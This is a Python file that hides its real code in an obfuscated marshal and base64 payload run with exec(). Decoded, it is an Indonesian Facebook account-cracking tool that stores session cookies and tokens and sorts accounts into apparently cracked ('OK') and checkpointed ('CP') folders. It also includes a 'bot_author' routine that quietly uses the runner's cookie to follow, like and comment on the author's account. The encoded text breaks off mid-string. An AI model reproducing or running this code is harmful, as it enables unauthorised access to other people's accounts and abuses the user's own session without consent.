import marshal
exec(marshal.loads('c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNsv<\x01\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xe0;\x01\x00IyEvdXNyL2Jpbi9weXRob24NCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIC0tLS0tLSBbIEdhdXNhaCBEaW9wcmVrIE50YXIgRXJyb3IgXSAtLS0tLS0gIw0KQXV0aG9yICAgID0gJ1ZSRUxMJw0KRmFjZWJvb2sgID0gJ2ZhY2Vib29rLmNvbS8xMDAwNjM1NTEyNTIzNzUnDQpTeWFmaWkgID0gMTAwMDYzNTUxMjUyMzc1DQpQb3N0aW5nYW4gPSA0NDA3NTg5MjQ3MTkxNDYNCmtvbWVudGFyICAgPSAnXG5cbmh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8nICsgc3RyKFBvc3RpbmdhbikNCiMjIyMjID4+Pj4gSU1QT1JUIE1PRFVMRQ0KaW1wb3J0IHJlcXVlc3RzLGJzNCxzeXMsb3MscmFuZG9tLHRpbWUscmUsanNvbix1dWlkLHN1YnByb2Nlc3MNCmZyb20gcmFuZG9tIGltcG9ydCByYW5kaW50DQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIFRocmVhZFBvb2wNCmZyb20gcmVxdWVzdHMuZXhjZXB0aW9ucyBpbXBvcnQgQ29ubmVjdGlvbkVycm9yDQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBwYXINCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIHBhcnNlcg0KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXANCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGUNCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lDQpmcm9tIHVybGxpYi5wYXJzZSBpbXBvcnQgcXVvdGUNCiMjIyMjIEJVQVQgV0FSTkEgPj4+PiBYDQpaID0gIlx4MWJbMDs5MG0iICAgICAjIEhpdGFtDQpNID0gIlx4MWJbMzg7NTsxOTZtIiAjIE1lcmFoDQpIID0gIlx4MWJbMzg7NTs0Nm0iICAjIEhpamF1DQpLID0gIlx4MWJbMzg7NTsyMjZtIiAjIEt1bmluZw0KQiA9ICJceDFiWzM4OzU7NDRtIiAgIyBCaXJ1DQpVID0gIlx4MWJbMTs5NW0iICAgICAjIFVuZ3UNCkkgPSAiXHgxYlsxOzk2bSIgICAgICMgQmlydSBNdWRhDQpQID0gIlx4MWJbMzg7NTsyMzFtIiAjIFB1dGloDQpKID0gIlx4MWJbMzg7NTsyMDhtIiAjIEppbmdnYQ0KQSA9ICJceDFiWzM4OzU7MjQ4bSIgIyBBYnUtQWJ1DQojIyMjIyBCVUFUIElNUE9SVCBZRyBCRUxVTSBJTlNUQUxMIEFIQUhIQUENCnRyeToNCglpbXBvcnQgcmVxdWVzdHMNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCglwcmludChmIntIfSAiKQ0KCXByaW50KGYie0h9Wypde019IE1vZHVsZSByZXF1ZXN0cyBiZWx1bSB0ZXJpbnN0YWxsIikNCglvcy5zeXN0ZW0oInBpcCBpbnN0YWxsIHJlcXVlc3RzIikNCnRyeToNCglpbXBvcnQgYnM0DQpleGNlcHQgSW1wb3J0RXJyb3I6DQoJcHJpbnQoZiJ7SH0gIikNCglwcmludChmIntIfVsqXXtNfSBNb2R1bGUgYnM0IGJlbHVtIHRlcmluc3RhbGwiKQ0KCW9zLnN5c3RlbSgicGlwIGluc3RhbGwgYnM0IikNCnRyeToNCglpbXBvcnQgY29uY3VycmVudC5mdXR1cmVzDQpleGNlcHQgSW1wb3J0RXJyb3I6DQoJcHJpbnQoZiJ7SH0gIikNCglwcmludChmIntIfVsqXXtNfSBNb2R1bGUgZnV0dXJlcyBiZWx1bSB0ZXJpbnN0YWxsIikNCglvcy5zeXN0ZW0oInBpcCBpbnN0YWxsIGZ1dHVyZXMiKQ0KaG9zdCA9ICgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tIikNCkIgPSByYW5kb20uY2hvaWNlKFtILFUsSixLXSkNCiMgUHJvc2VzIGRhdGENCm9zLnN5c3RlbSgnY2xlYXInKQ0Kc3VyYWRhZGkgPSBbIltDWUJFUl0iLCJbQz09PT09XSIsIls9WT09PV0iLCAiWz09Qj09XSIsICJbPT09RT1dIiwgIls9PT09Ul0iLCAiWz09PUM9XSIsICJbPT1CPT1dIiwgIls9RT09PV0iLCAiW1I9PT09XSIsICJceDFiWzA7OTJtW0NZQkVSXSIsIltDPT09PT1dIiwiWz1ZPT09XSIsICJbPT1CPT1dIiwgIls9PT1FPV0iLCAiWz09PT1SXSIsICJbPT09Qz1dIiwgIls9PUI9PV0iLCAiWz1FPT09XSIsICJbUj09PT1dIiwgIlx4MWJbMDs5Mm1bQ1lCRVJdIiwiW0M9PT09PV0iLCJbPVk9PT1dIiwgIls9PUI9PV0iLCAiWz09PUU9XSIsICJbPT09PVJdIiwgIls9PT1DPV0iLCAiWz09Sz09XSIsICJbPUk9PT1dIiwgIltSPT09PV0iLCAiXHgxYlswOzkybVtDWUJFUl0iLCJbWT09PT09XSIsIls9Qj09PV0iLCAiWz09RT09XSIsICJbPT09Uj1dIiwgIls9PT09Q10iLCAiWz09PVk9XSIsICJbPT1CPT1dIiwgIls9RT09PV0iLCAiW1I9PT09XSIsICJceDFiWzA7OTJtW0NZQkVSXSIsIltDPT09PT1dIiwiWz1ZPT09XSIsICJbPT1CPT1dIiwgIls9PT1FPV0iLCAiWz09PT1SXSIsICJbPT09Qz1dIiwgIls9PVk9PV0iLCAiWz1CPT09XSIsICJbUj09PT1dIiwgIlx4MWJbMDs5Mm1bQ1lCRVJdIiwiW0M9PT09PV0iLCJbPVk9PT1dIiwgIls9PUI9PV0iLCAiWz09PUU9XSIsICJbPT09PVJdIiwgIls9PT1DPV0iLCAiWz09WT09XSIsICJbPUI9PT1dIiwgIltSPT09PV0iLCAiXHgxYlswOzkybVtDWUJFUl0iLCJbQz09PT09XSIsIls9WT09PV0iLCAiWz09Qj09XSIsICJbPT09RT1dIiwgIls9PT09Ul0iLCAiWz09PUM9XSIsICJbPT1LPT1dIiwgIls9ST09PV0iLCAiW1I9PT09XSIsICJceDFiWzA7OTJtW0NZQkVSXSIsIltZPT09PT1dIiwiWz1CPT09XSIsICJbPT1FPT1dIiwgIls9PT1SPV0iLCAiWz09PT1DXSIsICJbPT09WT1dIiwgIls9PUI9PV0iLCAiWz1FPT09XSIsICJbUj09PT1dIiwgIlx4MWJbMDs5Mm1bQ1lCRVJdIiwiW0M9PT09PV0iLCJbPVk9PT1dIiwgIls9PUI9PV0iLCAiWz09PU89XSIsICJbPT09PURdIiwgIls9PT1PPV0iLCAiWz09Sz09XSIsICJbPUk9PT1dIiwgIltSPT09PV0iLCAiXHgxYlswOzkybVtDWUJFUl0iLCJbQz09PT09XSIsIls9WT09PV0iLCAiWz09Qj09XSIsICJbPT09RT1dIiwgIls9PT09Ul0iLCAiWz09PUM9XSIsICJbPT1ZPT1dIiwgIls9Qj09PV0iLCAiW1I9PT09XSIsICJceDFiWzA7OTJtW0NZQkVSXSIsIltDPT09PT1dIiwiWz1ZPT09XSIsICJbPT1CPT1dIiwgIls9PT1FPV0iLCAiWz09PT1SXSIsICJbPT09Qz1dIiwgIls9PVk9PV0iLCAiWz1CPT09XSIsICJbUj09PT1dIiwgIlx4MWJbMDs5Mm1bQ1lCRVJdIiwiW0M9PT09PV0iLCJbPVk9PT1dIiwgIls9PUI9PV0iLCAiWz09RT1dIiwgIls9PT09Ul0iLCAiWz09PUM9XSIsICJbPT1ZPT1dIiwgIls9Qj09PV0iLCAiW1I9PT09XSIsICJceDFiWzA7OTJtW0NZQkVSXSIsIltDPT09PT1dIiwiWz1ZPT09XSIsICJbPT1CPT1dIiwgIls9PT1FPV0iLCAiWz09PT1SXSIsICJbPT09Qz1dIiwgIls9PVk9PV0iLCAiWz1CPT09XSIsICJbUj09PT1dIiwgIlx4MWJbMDs5Mm1bQ1lCRVJdIiwiW0M9PT09PV0iLCJbPVk9PT1dIiwgIls9PUI9PV0iLCAiWz09PUU9XSIsICJbPT09PVJdIiwgIls9PT1DPV0iLCAiWz09WT09XSIsICJbPUI9PT1dIiwgIltSPT09PV0iLCAiXHgxYlswOzkybVtDWUJFUl0iLCJbQz09PT09XSIsIls9WT09PV0iLCAiWz09Qj09XSIsICJbPT09RT1dIiwgIls9PT09Ul0iLCAiWz09PUM9XSIsICJbPT1ZPT1dIiwgIls9Qj09PV0iLCAiW1I9PT09XSIsICJceDFiWzA7OTJtW0NZQkVSXSIsIltDPT09PT1dIiwiWz1ZPT09XSIsICJbPT1CPT1dIiwgIls9PT1FPV0iLCAiWz09PT1SXSIsICJbPT09Qz1dIiwgIls9PVk9PV0iLCAiWz1CPT09XSIsICJbUj09PT1dIiwgIlx4MWJbMDs5Mm1bQ1lCRVJdIiwiW0M9PT09PV0iLCJbPVk9PT1dIiwgIls9PUI9PV0iLCAiWz09PUU9XSIsICJbPT09PVJdIiwgIls9PT1DPV0iLCAiWz09WT09XSIsICJbPUI9PT1dIiwgIltSPT09PV0iLCAiXHgxYlswOzkybVtDWUJFUl0iLCJbQz09PT09XSIsIls9WT09PV0iLCAiWz09Qj09XSIsICJbPT09RT1dIiwgIls9PT09Ul0iLCAiWz09PUM9XSIsICJbPT1ZPT1dIiwgIls9Qj09PV0iLCAiW1I9PT09XSIsICJceDFiWzA7OTJtW0NZQkVSXSIsIltDPT09PT1dIiwiWz1ZPT09XSIsICJbPT1CPT1dIiwgIls9PT1FPV0iLCAiWz09PT1SXSIsICJbPT09Qz1dIiwgIls9PVk9PV0iLCAiWz1CPT09XSIsICJbUj09PT1dIiwgIlx4MWJbMDs5Mm1bQ1lCRVJdIiwiW0M9PT09PV0iLCJbPVk9PT1dIiwgIls9PUI9PV0iLCAiWz09PUU9XSIsICJbPT09PVJdIiwgIls9PT1PPV0iLCAiWz09Sz09XSIsICJbPUk9PT1dIiwgIltSPT09PV0iLCAiXHgxYlswOzkybVtDWUJFUl0iLCJbQz09PT09XSIsIls9WT09PV0iLCAiWz09Qj09XSIsICJbPT09Tz1dIiwgIls9PT09RF0iLCAiWz09PU89XSIsICJbPT1LPT1dIiwgIls9ST09PV0iLCAiW1I9PT09XSIsICJceDFiWzA7OTJtW0NZQkVSXSIsIltDPT09PT1dIiwiWz1ZPT09XSIsICJbPT1CPT1dIiwgIls9PT1FPV0iLCAiWz09PT1SXSIsICJbPT09Qz1dIiwgIls9PVk9PV0iLCAiWz1FPT09XSIsICJbUj09PT1dIiwgIlx4MWJbMDs5Mm1bQ1lCRVJdIiwiW0M9PT09PV0iLCJbPVk9PT1dIiwgIls9PUI9PV0iLCAiWz09PVI9XSIsICJbPT09PVJdIiwgIls9PT1DPV0iLCAiWz09WT09XSIsICJbPUI9PT1dIiwgIltSPT09PV0iLCAiXHgxYlswOzkybVtDWUJFUl0iLCJbQz09PT09XSIsIls9WT09PV0iLCAiWz09Qj09XSIsICJbPT09RT1dIiwgIls9PT09Ul0iLCAiWz09PUM9XSIsICJbPT1ZPT1dIiwgIls9Qj09PV0iLCAiW1I9PT09XSIsICJceDFiWzA7OTJtW0NZQkVSXSIsIltDPT09PT1dIiwiWz1ZPT09XSIsICJbPT1CPT1dIiwgIls9PT1FPV0iLCAiWz09PT1SXSIsICJbPT09Qz1dIiwgIls9PVk9PV0iLCAiWz1CPT09XSIsICJbUj09PT1dIiwgIlx4MWJbMDs5Mm1bQ1lCRVJdIiwiW0M9PT09PV0iLCJbPVk9PT1dIiwgIls9PUI9PV0iLCAiWz09PUU9XSIsICJbPT09PVJdIiwgIls9PT1DPV0iLCAiWz09WT09XSIsICJbPUk9PT1dIiwgIltSPT09PV0iLCAiXHgxYlswOzkybVtDWUJFUl0iLCJbUj09PT09XSIsIls9Qj09PV0iLCAiWz09RT09XSIsICJbPT09Uj1dIiwgIls9PT09Q10iLCAiWz09PVk9XSIsICJbPT1CPT1dIiwgIls9RT09PV0iLCAiW1I9PT09XSIsICJceDFiWzA7OTJtW0NZQkVSXSIsIltDPT09PT1dIiwiWz1ZPT09XSIsICJbPT1CPT1dIiwgIls9PT1FPV0iLCAiWz09PT1SXSIsICJbPT09Qz1dIiwgIls9PVk9PV0iLCAiWz1CPT09XSIsICJbUj09PT1dIiwgIlx4MWJbMDs5Mm1bQ1lCRVJdIiwiW0M9PT09PV0iLCJbPVk9PT1dIiwgIls9PUI9PV0iLCAiWz09PUU9XSIsICJbPT09PVJdIiwgIls9PT1DPV0iLCAiWz09WT09XSIsICJbPUI9PT1dIiwgIltSPT09PV0iLCAiXHgxYlswOzkybVtDWUJFUl0iLCJbQz09PT09XSIsIls9WT09PV0iLCAiWz09Qj09XSIsICJbPT09RT1dIiwgIls9PT09Ul0iLCAiWz09PUM9XSIsICJbPT1ZPT1dIiwgIls9Qj09PV0iLCAiW1I9PT09XSIsICJceDFiWzA7OTJtW0NZQkVSXSIsIltDPT09PT1dIiwiWz1ZPT09XSIsICJbPT1CPT1dIiwgIls9PT1FPV0iLCAiWz09PT1SXSIsICJbPT09Qz1dIiwgIls9PVk9PV0iLCAiWz1CPT09XSIsICJbUj09PT1dIiwgIlx4MWJbMDs5Mm1bQ1lCRVJdIiwiW0M9PT09PV0iLCJbPVk9PT1dIiwgIls9PUI9PV0iLCAiWz09PUU9XSIsICJbPT09PVJdIiwgIls9PT1DPV0iLCAiWz09WT09XSIsICJbPUI9PT1dIiwgIltSPT09PV0iLCAiXHgxYlswOzkybVtDWUJFUl0iLCJbQz09PT09XSIsIls9WT09PV0iLCAiWz09Qj09XSIsICJbPT09RT1dIiwgIls9PT09Ul0iLCAiWz09PUM9XSIsICJbPT1ZPT1dIiwgIls9Qj09PV0iLCAiW1I9PT09XSIsICJceDFiWzA7OTJtW0NZQkVSXSIsIltDPT09PT1dIiwiWz1ZPT09XSIsICJbPT1CPT1dIiwgIls9PT1FPV0iLCAiWz09PT1SXSIsICJbPT09Qz1dIiwgIls9PVk9PV0iLCAiWz1CPT09XSIsICJbUj09PT1dIiwgIlx4MWJbMDs5Mm1bQ1lCRVJdIiwiW0M9PT09PV0iLCJbPVk9PT1dIiwgIls9PUI9PV0iLCAiWz09PUU9XSIsICJbPT09PVJdIiwgIls9PT1DPV0iLCAiWz09WT09XSIsICJbPUI9PT1dIiwgIltSPT09PV0iLCAiXHgxYlswOzkybVtDWUJFUl0iXQ0KZm9yIGkgaW4gcmFuZ2UobGVuKHN1cmFkYWRpKSk6DQogICAgdGltZS5zbGVlcCgwLjA0MjMpDQogICAgc3lzLnN0ZG91dC53cml0ZSgiXHJcMzNbMTs5Nm1CT1QgQ1lCRVIgQ1JBQ0sgXDMzWzE7OTZtQlkgOiBcMDMzWzkybUlNSU4gQ1lCRVIgWERceDFiWzA7MzZtICIrIHJhbmRvbS5jaG9pY2UoWydceDFiWzA7MzNtJywgJ1x4MWJbMDszNm0nLCAnXHgxYlswOzM1bScsICdceDFiWzA7MzZtJywgJ1x4MWJbMDszNW0nXSkgKyBzdXJhZGFkaVtpICUgbGVuKHN1cmFkYWRpKV0pDQogICAgc3lzLnN0ZG91dC5mbHVzaCgpDQpvcy5zeXN0ZW0oImNsZWFyIikNCg0KIyBCQU5ORVINCiMjIyMgQlVBVCBCQU5ORVINCmRlZiBiYW5uZXIoKToNCiAgICB3YXJfZG9tID0gcmFuZG9tLmNob2ljZShbUCxLLEIsSixVLEhdKQ0KICAgIHByaW50KCIiIg0KXDMzWzE7OTZtKiYmJiAgICYmJiYmJiAgICAgJiYmJiYmICAgICYmJiAgICAmJiYmJiYgICAgJiYmXDAzM1sxOzMybQ0KICYmJiAgICYmJiYmJiAgICAgJiYmJiYmICAgICYmJiAgICAmJiYmJiYmICAgJiYmDQogJiYmICAgJiYmICYmJiAgICYmJiAmJiYgICAgJiYmICAgICYmJiAgJiYmICAmJiYNCiAmJiYgICAmJiYgICYmJiAmJiYgICYmJiAgICAmJiYgICAgJiYmICAgJiYmICYmJg0KICYmJiAgICYmJiAgICYmJiYmICAgJiYmICAgICYmJiAgICAmJiYgICAgJiYmJiYmDQogJiYmICAgJiYmICAgICYmJiAgICAmJiYgICAgJiYmICAgICYmJiAgICAgJiYmJiYNCiAmJiYgICAmJiYgICAgICAgICAgICYmJiAgICAmJiYgICAgJiYmJiAgICAgJiYmJg0KXDMzWzE7OTZtJiYmJiYgJiYmJiYmJiAgICAgICAmJiYmJiYgJiYmJiYmICYmJiYmJiYgICAgJiYmXDAzM1sxOzMybQ0KX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fDQoNCiAgTkVXIFNDUklQVCAgIDogXDMzWzE7OTZtRURJVElPTiBMSU1JVEVEXDAzM1sxOzMybQ0KDQogIEZBQ0VCT09LICAgICA6IFwzM1sxOzk2bUlNSU4gQ1lCRVIgWERcMDMzWzE7MzJtDQpcMDMzWzE7MzJtX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXw0KDQogXDMzWzE7OTZt4piG4piGIFwwMzNbMTszMm1TRUxBTUFUIERBVEFORyBLT05UT0wgU0lMQUhLQU4gUElMSUggTUVOVSBDT0xJIE5ZQSBcMzNbMTs5Nm3imIbimIZcMDMzWzE7MzJtIiIiKQ0KIA0KIyMjLS0tLS0tLS0tLVsgVElNRSBdLS0tLS0tLS0tLSAjIyMNCnNrcm5nID0gZGF0ZXRpbWUubm93KCkNCnRhaHVuID0gc2tybmcueWVhcg0KYnVsYW4gPSBza3JuZy5tb250aA0KaGFyaSAgPSBza3JuZy5kYXkNCmJ1bGFuX3R0bCA9IHsiMDEiOiAiSmFudWFyaSIsICIwMiI6ICJGZWJydWFyaSIsICIwMyI6ICJNYTdyZXQiLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWVpIiwgIjA2IjogIkp1bmkiLCAiMDciOiAiSnVsaSIsICIwOCI6ICJBZ3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPa3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlc2VtYmVyIn0NCmJ1bGFuX2NlayA9IFsiSmFudWFyaSIsICJGZWJydWFyaSIsICJNYXJldCIsICJBcHJpbCIsICJNZWkiLCAiSnVuaSIsICJKdWxpIiwgIkFndXN0dXMiLCAiU2VwdGVtYmVyIiwgIk9rdG9iZXIiLCAiTm92ZW1iZXIiLCAiRGVzZW1iZXIiXQ0KdHJ5Og0KICAgIGlmIGJ1bGFuIDwgMCBvciBidWxhbiA+IDEyOg0KICAgICAgICBleGl0KCkNCiAgICBidWxhbl9za3JuZyA9IGJ1bGFuIC0gMQ0KZXhjZXB0IFZhbHVlRXJyb3I6DQogICAgZXhpdCgpDQpfYnVsYW5fID0gYnVsYW5fY2VrW2J1bGFuX3Nrcm5nXQ0KdGFuZ2dhbCA9ICgiJXMtJXMtJXMiJShoYXJpLF9idWxhbl8sdGFodW4pKQ0KDQojIyMjIyBCVUFUIFNUUiAvTEVODQppZCA9IFtdDQpvayA9IFtdDQpjcCA9IFtdDQpsb29wPTANCg0KIyMjLS0tLS0tLS0tLVsgQ0xFQVIgVEVSTUlOQUwgXS0tLS0tLS0tLS0gIyMjDQpkZWYgcmVzaWsoKToNCiAgICBpZiAibGludXgiIGluIHN5cy5wbGF0Zm9ybS5sb3dlcigpOg0KICAgICAgICB0cnk6b3Muc3lzdGVtKCJjbGVhciIpDQogICAgICAgIGV4Y2VwdDpwYXNzDQogICAgZWxpZiAid2luIiBpbiBzeXMucGxhdGZvcm0ubG93ZXIoKToNCiAgICAgICAgdHJ5Om9zLnN5c3RlbSgiY2xzIikNCiAgICAgICAgZXhjZXB0OnBhc3MNCiAgICBlbHNlOg0KICAgICAgICB0cnk6b3Muc3lzdGVtKCJjbGVhciIpDQogICAgICAgIGV4Y2VwdDpwYXNzDQoNCiMjIyBCVUFUIEFOSU1BU0kgSkFMQU4NCmRlZiBqYWxhbih6KToNCglmb3IgZSBpbiB6ICsgIlxuIjoNCgkJc3lzLnN0ZG91dC53cml0ZShlKQ0KCQlzeXMuc3Rkb3V0LmZsdXNoKCkNCgkJdGltZS5zbGVlcCgwLjAzKQ0KCQkNCiMjIy0tLS0tLS0tLS1bIEdMT0JBTCBVUkwgJiBIRUFERVJTIF0tLS0tLS0tLS0tICMjIw0KdXJsX2J1c2lubmVzcyA9ICJodHRwczovL2J1c2luZXNzLmZhY2Vib29rLmNvbSINCnVhX2J1c2luZXNzID0gIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjEuMDsgTUkgOCBCdWlsZC9PUE0xLjE3MTAxOS4wMTEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS82OS4wLjM0OTcuODYgTW9iaWxlIFNhZmFyaS81MzcuMzYiDQprYXRhX2RldiA9ICdMdSBHYW50ZW5nIEJhbmdldCBCYW5nLiBHdyBNYXUgUmVjb2RlIFNDbHUsIFNvYWxueWEgR3cgR29ibG9rIFNvYWwgQ29kaW5nJw0Kd2ViX2ZiID0gImh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8iDQptX2ZiID0gImh0dHBzOi8vbS5mYWNlYm9vay5jb20vIg0KbWJhc2ljID0gImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS8iDQpoZWFkZXJfZ3J1cCA9IHsidXNlci1hZ2VudCI6ICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE1pIDlUIFBybyBCdWlsZC9RS1ExLjE5MDgyNS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pZF9JRDtGQkFWLzIzOS4wLjAuMTAuMTA5O10ifQ0KDQojIyMtLS0tLS0tLS0tWyBDUkVBVEUgRk9MREVSIF0tLS0tLS0tLS0tICMjIw0KZGVmIG1rZGlyX2RhdGFfbG9naW4oKToNCiAgICAjIE1ha2UgRGlyZWN0b3J5IExvZ2luIERhdGENCiAgICB0cnk6b3MubWtkaXIoImxvZ2luIikNCiAgICBleGNlcHQ6cGFzcw0KICAgICMgTWFrZSBEaXJlY3RvcnkgUmVzdWx0DQogICAgdHJ5Om9zLm1rZGlyKCJDUCIpDQogICAgZXhjZXB0OnBhc3MNCiAgICAjIE1ha2UgRGlyZWN0b3J5IFJlc3VsdA0KICAgIHRyeTpvcy5ta2RpcigiT0siKQ0KICAgIGV4Y2VwdDpwYXNzDQogICAgIyBEZWxldGUgQ29va2llcw0KICAgIHRyeTpvcy5yZW1vdmUoJ2xvZ2luL2Nvb2tpZS5qc29uJykNCiAgICBleGNlcHQ6cGFzcw0KICAgICMgRGVsZXRlIFRva2VuDQogICAgdHJ5Om9zLnJlbW92ZSgnbG9naW4vdG9rZW4uanNvbicpDQogICAgZXhjZXB0OnBhc3MNCiMjIy0tLS0tLS0tLS1bIENIQU5HRSBMQU5HVUFHRSBdLS0tLS0tLS0tLSAjIyMNCmRlZiBsYW5ndWFnZShjb29raWUpOg0KICAgIHRyeToNCiAgICAgICAgd2l0aCByZXF1ZXN0cy5TZXNzaW9uKCkgYXMgeHl6Og0KICAgICAgICAgICAgcmVxID0geHl6LmdldCgnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xhbmd1YWdlLycsY29va2llcz1jb29raWUpDQogICAgICAgICAgICBwcmEgPSBwYXIocmVxLmNvbnRlbnQsJ2h0bWwucGFyc2VyJykNCiAgICAgICAgICAgIGZvciB4IGluIHByYS5maW5kX2FsbCgnZm9ybScseydtZXRob2QnOidwb3N0J30pOg0KICAgICAgICAgICAgICAgIGlmICdCYWhhc2EgSW5kb25lc2lhJyBpbiBzdHIoeCk6DQogICAgICAgICAgICAgICAgICAgIGJhaGFzYSA9IHsNCiAgICAgICAgICAgICAgICAgICAgICAgICJmYl9kdHNnIiA6IHJlLnNlYXJjaCgnbmFtZT0iZmJfZHRzZyIgdmFsdWU9IiguKj8pIicsc3RyKHJlcS50ZXh0KSkuZ3JvdXAoMSksDQogICAgICAgICAgICAgICAgICAgICAgICAiamF6b2VzdCIgOiByZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIocmVxLnRleHQpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICJzdWJtaXQiICA6ICJCYWhhc2EgSW5kb25lc2lhIg0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB1cmwgPSAnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tJyArIHhbJ2FjdGlvbiddDQogICAgICAgICAgICAgICAgICAgIGV4ZWMgPSB4eXoucG9zdCh1cmwsZGF0YT1iYWhhc2EsY29va2llcz1jb29raWUpDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOnBhc3MNCg0KIyMjLS0tLS0tLS0tLVsgQ09OVkVSVCBVU0VSTkFNRSBLRSBJRCBdLS0tLS0tLS0tLSAjIyMNCmRlZiBjb252ZXJ0X2lkKHVzZXJuYW1lKToNCiAgICB0cnk6DQogICAgICAgIGNvb2tpZSA9IHsnY29va2llJzpvcGVuKCdsb2dpbi9jb29raWUuanNvbicsJ3InKS5yZWFkKCl9DQogICAgICAgIHVybCAgICA9ICdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vJyArIHVzZXJuYW1lDQogICAgICAgIHdpdGggcmVxdWVzdHMuU2Vzc2lvbigpIGFzIHh5ejoNCiAgICAgICAgICAgIHJlcSA9IHBhcih4eXouZ2V0KHVybCxjb29raWVzPWNvb2tpZSkuY29udGVudCwnaHRtbC5wYXJzZXInKQ0KICAgICAgICAgICAga3V0ID0gcmVxLmZpbmQoJ2EnLHN0cmluZz0nTGFpbm55YScpDQogICAgICAgICAgICBpZCA9IHN0cihrdXRbJ2hyZWYnXSkuc3BsaXQoJz0nKVsxXQ0KICAgICAgICAgICAgIyBpZCA9IHJlLnNlYXJjaCgnb3duZXJfaWQ9KC4qPykiJyxzdHIoa3V0KSkuZ3JvdXAoMSkNCiAgICAgICAgICAgIHJldHVybihpZCkNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6cmV0dXJuKHVzZXJuYW1lKQ0KICAgIA0KIyMjLS0tLS0tLS0tLVsgRVhDRVBUSU9OIF0tLS0tLS0tLS0tICMjIw0KZGVmIGtlY3VhbGkoZXJyb3IpOg0KICAgIHByaW50KGYie1B9WytdIFRlcmphZGkgS2VzYWxhaGFuICEiKQ0KICAgIHByaW50KGYie1B9WytdIFRpZGFrIERhcGF0IE1lbmdla3Nla3VzaSIoZXJyb3IpKQ0KICAgIHByaW50KGYie1B9WytdIEhhbCBJbmkgTXVuZ2tpbiBUZXJqYWRpIDogIikNCiAgICBwcmludChmIntQfVswMV0gQ29va2llcy9Ub2tlbiBJbnZhbGlkIikNCiAgICBwcmludChmIntQfVswMl0gU2FsYWggTWVtYXN1a2thbiBJRCIpDQogICAgcHJpbnQoZiJ7UH1bMDNdIGJ1ZyBQYWRhIFNvdXJjZSBDb2RlIikNCiAgICBwcmludChmIntQfVswNF0gQnVnIFBhZGEgUmVxdWVzdHMiKQ0KICAgIHByaW50KGYie1B9WzA1XSBEYW4gTGFpbi1MYWluIikNCiAgICBwcmludChmIntQfVvigKJdIEphbGFua2FuIFVsYW5nIFNvdXJjZSBDb2RlIEluaSA6ICIpDQogICAgcHJpbnQoZiJ7UH1b4oCiXSBweXRob24gbWJmdjMucHkiKQ0KICAgIGV4aXQoKQ0KDQojIyMtLS0tLS0tLS0tW0JPVCBBVVRIT1IgSkFOR0FOIERJR0FOVEkgXS0tLS0tLS0tLS0gIyMjDQpjbGFzcyBib3RfYXV0aG9yOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLGNvb2tpZSx0b2tlbixjb29raWVfbWVudGFoKToNCiAgICAgICAgc2VsZi5sb29wID0gMDtzZWxmLmNvb2tpZV9tZW50YWggPSBjb29raWVfbWVudGFoO2xpc3RfaWQgICA9IFtzdHIoU3lhZmlpKV07c2VsZi5rb21lbiA9IFsnTWFudGFwIEJhbmcnLCdTZW1hbmdhdCBUZXJ1cycsJ3ZlZ2EgY2FzcGVyJywnYmcgc3lhZmlrIGdhbnRlbmcnXQ0KICAgICAgICBmb3IgeCBpbiBsaXN0X2lkOiBzZWxmLmdldF9mb2xscyh4LGNvb2tpZSk7IHNlbGYuZ2V0X2xpa2VycyhmJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS97eH0/dj10aW1lb